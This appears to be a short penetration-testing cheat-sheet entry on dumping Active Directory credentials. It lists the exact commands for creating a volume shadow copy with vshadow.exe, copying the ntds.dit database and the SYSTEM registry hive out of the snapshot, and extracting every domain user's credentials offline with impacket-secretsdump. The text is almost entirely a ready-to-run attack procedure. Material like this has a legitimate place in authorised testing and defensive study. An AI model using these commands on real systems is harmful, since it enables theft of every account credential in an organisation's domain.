Shadow Copies:

As domain admins we can abuse the vshadow utility to create a shadow copy that will allow us to extract the AD database ntds.dit file. once we have obtained that we can extract every user credential offline


Performing a Shadow Copy of the entire C: drive:
vshadow.exe -nw -p  C:



once the snapshot is taken we note the shadow copy device name
and now copy the whole ad databsae from the shadow copy to the C: drive root folder:


copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

reg.exe save hklm\system c:\system.bak


then we move these files to our kali machine where we use impacket-secretsdump to extract the credentials


impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL




